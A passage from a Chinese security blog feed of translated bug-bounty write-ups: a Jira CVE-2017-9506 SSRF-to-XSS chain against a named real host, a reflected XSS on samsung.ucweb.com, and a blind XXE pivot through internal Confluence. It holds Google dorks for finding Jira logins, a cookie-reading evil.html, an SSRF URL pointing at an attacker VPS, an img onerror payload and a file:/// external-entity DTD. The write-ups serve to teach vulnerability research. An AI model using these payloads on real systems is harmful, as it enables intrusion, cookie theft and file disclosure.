<h4 id="如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法"><a href="#如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法" class="headerlink" title="如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法"></a>如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">inurl:visma intitle:JIRA login</div><div class="line">inurl:companyname intitle:JIRA login</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/1.png" alt=""></p>
<h4 id="emsp-emsp-我注意到域名https-customer-incident-consulting-visma-com-具有JIRA-6-3-1版本。我记得CVE-2017-9506-影响范围是Jira-versions-lt-7-3-5，所以我尝试验证一下该网站是否具有SSRF漏洞"><a href="#emsp-emsp-我注意到域名https-customer-incident-consulting-visma-com-具有JIRA-6-3-1版本。我记得CVE-2017-9506-影响范围是Jira-versions-lt-7-3-5，所以我尝试验证一下该网站是否具有SSRF漏洞" class="headerlink" title="&emsp;&emsp;我注意到域名https://customer-incident.consulting.visma.com 具有JIRA 6.3.1版本。我记得CVE-2017-9506 影响范围是Jira versions &lt; 7.3.5，所以我尝试验证一下该网站是否具有SSRF漏洞"></a>&emsp;&emsp;我注意到域名<a href="https://customer-incident.consulting.visma.com" target="_blank" rel="external">https://customer-incident.consulting.visma.com</a> 具有JIRA 6.3.1版本。我记得CVE-2017-9506 影响范围是Jira versions &lt; 7.3.5，所以我尝试验证一下该网站是否具有SSRF漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://customer-incident.consulting.visma.com/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.baidu.com</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/2.png" alt=""></p>
<h4 id="emsp-emsp-我尝试获取一些网站内部数据或获取读取权限，但是我失败了。-如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具Jira-Scan"><a href="#emsp-emsp-我尝试获取一些网站内部数据或获取读取权限，但是我失败了。-如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具Jira-Scan" class="headerlink" title="&emsp;&emsp;我尝试获取一些网站内部数据或获取读取权限，但是我失败了。 如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具Jira-Scan"></a>&emsp;&emsp;我尝试获取一些网站内部数据或获取读取权限，但是我失败了。 如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具<a href="https://github.com/random-robbie/Jira-Scan" target="_blank" rel="external">Jira-Scan</a></h4><h4 id="emsp-emsp-另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到https-customer-incident-consulting-visma-com-网站的用户cookie，而不是百度的cookie"><a href="#emsp-emsp-另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到https-customer-incident-consulting-visma-com-网站的用户cookie，而不是百度的cookie" class="headerlink" title="&emsp;&emsp;另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到https://customer-incident.consulting.visma.com 网站的用户cookie，而不是百度的cookie"></a>&emsp;&emsp;另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到<a href="https://customer-incident.consulting.visma.com" target="_blank" rel="external">https://customer-incident.consulting.visma.com</a> 网站的用户cookie，而不是百度的cookie</h4><p>[*]攻击者创建的evil.html</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;SSRF to XSS on Jira Vulnerable Instances&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">  &lt;script&gt;</div><div class="line">   alert( document.domain + &quot; is vulnerable&quot; );</div><div class="line">            alert( document.cookie);</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/4.png" alt=""></p>
<h4 id="emsp-emsp-现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie"><a href="#emsp-emsp-现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie" class="headerlink" title="&emsp;&emsp;现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie"></a>&emsp;&emsp;现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://customer-incident.consulting.visma.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://VPSIP/evil.html</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/3.png" alt=""></p>
<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第四篇翻译：XSS漏洞]]></title>
      <url>/2018/12/21/%E7%AC%AC%E5%9B%9B%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h4 id="原文：Dom-Based-XSS-in-ucweb-com"><a href="#原文：Dom-Based-XSS-in-ucweb-com" class="headerlink" title="原文：Dom Based XSS in ucweb.com"></a>原文：<a href="https://medium.com/@sudhanshur705/story-about-my-first-bug-bounty-9fe710be8241" target="_blank" rel="external">Dom Based XSS in ucweb.com</a></h4><h4 id="漏洞：XSS"><a href="#漏洞：XSS" class="headerlink" title="漏洞：XSS"></a>漏洞：XSS</h4><h4 id="作者：Sudhanshu-Rajbhar"><a href="#作者：Sudhanshu-Rajbhar" class="headerlink" title="作者：Sudhanshu Rajbhar"></a>作者：Sudhanshu Rajbhar</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h2 id="现在开始…"><a href="#现在开始…" class="headerlink" title="现在开始…."></a>现在开始….</h2><h4 id="emsp-emsp-首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb-com的子域名时，我发现了这个子域-samsung-ucweb-com-，samsung-三星？似乎有点意思，所以我尝试用浏览器去访问它"><a href="#emsp-emsp-首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb-com的子域名时，我发现了这个子域-samsung-ucweb-com-，samsung-三星？似乎有点意思，所以我尝试用浏览器去访问它" class="headerlink" title="&emsp;&emsp;首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb.com的子域名时，我发现了这个子域 samsung.ucweb.com ，samsung 三星？似乎有点意思，所以我尝试用浏览器去访问它"></a>&emsp;&emsp;首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb.com的子域名时，我发现了这个子域 samsung.ucweb.com ，samsung 三星？似乎有点意思，所以我尝试用浏览器去访问它</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/1.png" alt=""></p>
<h4 id="emsp-emsp-很不幸，这是一个403-禁用的网站，如果是你碰见了下一步会怎么做？很显然，大多数人都会忽略它，然后测试其它子域。不过我曾读过一篇文章，它说如果你遇到这样的网站，尝试用Google-搜索一下相关站点信息，或许会有惊喜发现"><a href="#emsp-emsp-很不幸，这是一个403-禁用的网站，如果是你碰见了下一步会怎么做？很显然，大多数人都会忽略它，然后测试其它子域。不过我曾读过一篇文章，它说如果你遇到这样的网站，尝试用Google-搜索一下相关站点信息，或许会有惊喜发现" class="headerlink" title="&emsp;&emsp;很不幸，这是一个403 禁用的网站，如果是你碰见了下一步会怎么做？很显然，大多数人都会忽略它，然后测试其它子域。不过我曾读过一篇文章，它说如果你遇到这样的网站，尝试用Google 搜索一下相关站点信息，或许会有惊喜发现"></a>&emsp;&emsp;很不幸，这是一个403 禁用的网站，如果是你碰见了下一步会怎么做？很显然，大多数人都会忽略它，然后测试其它子域。不过我曾读过一篇文章，它说如果你遇到这样的网站，尝试用Google 搜索一下相关站点信息，或许会有惊喜发现</h4><h4 id="emsp-emsp-所以我是用谷歌语法简单的看了一下，site-samsung-ucweb-com-结果真的有惊喜"><a href="#emsp-emsp-所以我是用谷歌语法简单的看了一下，site-samsung-ucweb-com-结果真的有惊喜" class="headerlink" title="&emsp;&emsp;所以我是用谷歌语法简单的看了一下，site:samsung.ucweb.com  结果真的有惊喜"></a>&emsp;&emsp;所以我是用谷歌语法简单的看了一下，<strong>site:samsung.ucweb.com </strong> 结果真的有惊喜</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/2.png" alt=""></p>
<h4 id="emsp-emsp-我打开了这个URL：http-samsung-ucweb-com-webstore-classify-html-dataKey-LifeStyle-amp-title-LifeStyle-并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了"><a href="#emsp-emsp-我打开了这个URL：http-samsung-ucweb-com-webstore-classify-html-dataKey-LifeStyle-amp-title-LifeStyle-并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了" class="headerlink" title="&emsp;&emsp;我打开了这个URL：http://samsung.ucweb.com/webstore/classify.html?dataKey=LifeStyle&amp;title=LifeStyle 并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了"></a>&emsp;&emsp;我打开了这个URL：<a href="http://samsung.ucweb.com/webstore/classify.html?dataKey=LifeStyle&amp;title=LifeStyle" target="_blank" rel="external">http://samsung.ucweb.com/webstore/classify.html?dataKey=LifeStyle&amp;title=LifeStyle</a> 并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/3.png" alt=""></p>
<h4 id="emsp-emsp-所以我尝试构造payload来利用这个漏洞点，当我使用”-gt-lt-script-gt-alert-1-lt-script-gt-时并没有任何弹窗，所以我尝试用-lt-img-gt-标签"><a href="#emsp-emsp-所以我尝试构造payload来利用这个漏洞点，当我使用”-gt-lt-script-gt-alert-1-lt-script-gt-时并没有任何弹窗，所以我尝试用-lt-img-gt-标签" class="headerlink" title="&emsp;&emsp;所以我尝试构造payload来利用这个漏洞点，当我使用”&gt; &lt; script&gt;alert(1)&lt;/ script&gt;时并没有任何弹窗，所以我尝试用 &lt; img&gt;标签"></a>&emsp;&emsp;所以我尝试构造payload来利用这个漏洞点，当我使用”&gt; &lt; script&gt;alert(1)&lt;/ script&gt;时并没有任何弹窗，所以我尝试用 &lt; img&gt;标签</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;img src=x onerror=alert(‘XSS’)&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/4.png" alt=""></p>
<h2 id="视屏演示"><a href="#视屏演示" class="headerlink" title="视屏演示"></a>视屏演示</h2><video id="video" controls preload="none" poster="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=885582068,2021597601&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/XSS_in_alibaba.mp4" type="video/mp4"><br></video>




<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第三篇翻译：XXE漏洞]]></title>
      <url>/2018/12/20/%E7%AC%AC%E4%B8%89%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9AXXE%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h4 id="原文：From-blind-XXE-to-root-level-file-read-access"><a href="#原文：From-blind-XXE-to-root-level-file-read-access" class="headerlink" title="原文：From blind XXE to root-level file read access"></a>原文：<a href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/" target="_blank" rel="external">From blind XXE to root-level file read access</a></h4><h4 id="漏洞：Blind-XXE"><a href="#漏洞：Blind-XXE" class="headerlink" title="漏洞：Blind XXE"></a>漏洞：Blind XXE</h4><h4 id="作者：Pieter"><a href="#作者：Pieter" class="headerlink" title="作者：Pieter"></a>作者：Pieter</h4><h4 id="难度：高"><a href="#难度：高" class="headerlink" title="难度：高"></a>难度：高</h4><a id="more"></a>
<h4 id="emsp-emsp-接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！"><a href="#emsp-emsp-接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！" class="headerlink" title="&emsp;&emsp;接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！"></a>&emsp;&emsp;接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！</h4><h2 id="我关注的重点？"><a href="#我关注的重点？" class="headerlink" title="我关注的重点？"></a>我关注的重点？</h2><h4 id="emsp-emsp-一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。"><a href="#emsp-emsp-一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。" class="headerlink" title="&emsp;&emsp;一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。"></a>&emsp;&emsp;一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/1.png" alt=""></p>
<h4 id="emsp-emsp-当我将请求方法改为POST，并且增加一个请求头-Content-Type-application-xml，再添加了一个XML主体之后，响应消息让我大吃一惊！"><a href="#emsp-emsp-当我将请求方法改为POST，并且增加一个请求头-Content-Type-application-xml，再添加了一个XML主体之后，响应消息让我大吃一惊！" class="headerlink" title="&emsp;&emsp;当我将请求方法改为POST，并且增加一个请求头 Content-Type: application/xml，再添加了一个XML主体之后，响应消息让我大吃一惊！"></a>&emsp;&emsp;当我将请求方法改为POST，并且增加一个请求头 Content-Type: application/xml，再添加了一个XML主体之后，响应消息让我大吃一惊！</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/2.png" alt=""></p>
<h4 id="emsp-emsp-继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用"><a href="#emsp-emsp-继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用" class="headerlink" title="&emsp;&emsp;继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用"></a>&emsp;&emsp;继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/3.png" alt=""></p>
<h4 id="emsp-emsp-尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE-定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏"><a href="#emsp-emsp-尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE-定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏" class="headerlink" title="&emsp;&emsp;尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE 定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏"></a>&emsp;&emsp;尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE 定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/4.png" alt=""></p>
<h4 id="emsp-emsp-我紧张的看着我的Burp-Collaborator-的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP-53端口开放"><a href="#emsp-emsp-我紧张的看着我的Burp-Collaborator-的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP-53端口开放" class="headerlink" title="&emsp;&emsp;我紧张的看着我的Burp Collaborator 的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP 53端口开放"></a>&emsp;&emsp;我紧张的看着我的Burp Collaborator 的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP 53端口开放</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/5.png" alt=""></p>
<h2 id="盲注…"><a href="#盲注…" class="headerlink" title="盲注…"></a>盲注…</h2><h4 id="emsp-emsp-当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response-error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错"><a href="#emsp-emsp-当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response-error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错" class="headerlink" title="&emsp;&emsp;当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错"></a>&emsp;&emsp;当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/6.png" alt=""></p>
<h4 id="emsp-emsp-当访问不存在的文件时，Response-error-响应信息不同，它会提示文件不存在"><a href="#emsp-emsp-当访问不存在的文件时，Response-error-响应信息不同，它会提示文件不存在" class="headerlink" title="&emsp;&emsp;当访问不存在的文件时，Response error 响应信息不同，它会提示文件不存在"></a>&emsp;&emsp;当访问不存在的文件时，Response error 响应信息不同，它会提示文件不存在</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/7.png" alt=""></p>
<h4 id="emsp-emsp-接下来我们尝试利用这个blind-XXE-漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind-XXE-类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息"><a href="#emsp-emsp-接下来我们尝试利用这个blind-XXE-漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind-XXE-类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息" class="headerlink" title="&emsp;&emsp;接下来我们尝试利用这个blind XXE 漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind XXE 类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息"></a>&emsp;&emsp;接下来我们尝试利用这个blind XXE 漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind XXE 类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/8.png" alt=""></p>
<h4 id="emsp-emsp-既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！"><a href="#emsp-emsp-既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！" class="headerlink" title="&emsp;&emsp;既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！"></a>&emsp;&emsp;既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/9.png" alt=""></p>
<h4 id="emsp-emsp-现在我们尝试利用Bind-XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response-error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！"><a href="#emsp-emsp-现在我们尝试利用Bind-XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response-error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！" class="headerlink" title="&emsp;&emsp;现在我们尝试利用Bind XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！"></a>&emsp;&emsp;现在我们尝试利用Bind XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wiki.company.internal</div><div class="line">jira.company.internal</div><div class="line">confluence.company.internal</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/10.png" alt=""></p>
<h2 id="柳暗花明？！"><a href="#柳暗花明？！" class="headerlink" title="柳暗花明？！"></a>柳暗花明？！</h2><h4 id="emsp-emsp-当我们访问jira-company-internal-这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章-https-www-freebuf-com-vuls-168719-html"><a href="#emsp-emsp-当我们访问jira-company-internal-这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章-https-www-freebuf-com-vuls-168719-html" class="headerlink" title="&emsp;&emsp;当我们访问jira.company.internal 这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章 https://www.freebuf.com/vuls/168719.html"></a>&emsp;&emsp;当我们访问jira.company.internal 这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章 <a href="https://www.freebuf.com/vuls/168719.html" target="_blank" rel="external">https://www.freebuf.com/vuls/168719.html</a></h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/11.png" alt=""></p>
<h4 id="emsp-emsp-代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP-8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp-Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败…"><a href="#emsp-emsp-代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP-8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp-Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败…" class="headerlink" title="&emsp;&emsp;代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP 8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败…."></a>&emsp;&emsp;代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP 8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败….</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/12.png" alt=""></p>
<h4 id="emsp-emsp-出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站http-Confluence-company-internal-上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦"><a href="#emsp-emsp-出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站http-Confluence-company-internal-上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦" class="headerlink" title="&emsp;&emsp;出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站http://Confluence.company.internal 上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦"></a>&emsp;&emsp;出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站<a href="http://Confluence.company.internal" target="_blank" rel="external">http://Confluence.company.internal</a> 上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/13.png" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/14.png" alt=""></p>
<h4 id="emsp-emsp-Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind-XXE进行攻击啦-此处应该有掌声👏-，如果不清楚bind-XXE的利用方法的话可以参考freebuf上的文章-https-www-freebuf-com-column-181064-html"><a href="#emsp-emsp-Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind-XXE进行攻击啦-此处应该有掌声👏-，如果不清楚bind-XXE的利用方法的话可以参考freebuf上的文章-https-www-freebuf-com-column-181064-html" class="headerlink" title="&emsp;&emsp;Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind XXE进行攻击啦(此处应该有掌声👏)，如果不清楚bind XXE的利用方法的话可以参考freebuf上的文章 https://www.freebuf.com/column/181064.html"></a>&emsp;&emsp;Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind XXE进行攻击啦(此处应该有掌声👏)，如果不清楚bind XXE的利用方法的话可以参考freebuf上的文章 <a href="https://www.freebuf.com/column/181064.html" target="_blank" rel="external">https://www.freebuf.com/column/181064.html</a></h4><p>[*]攻击者服务器上的evil.xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM &quot;file:///&quot;&gt;</div><div class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &apos;%file;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
<p>[*]burp发送的xml注入语句</p>
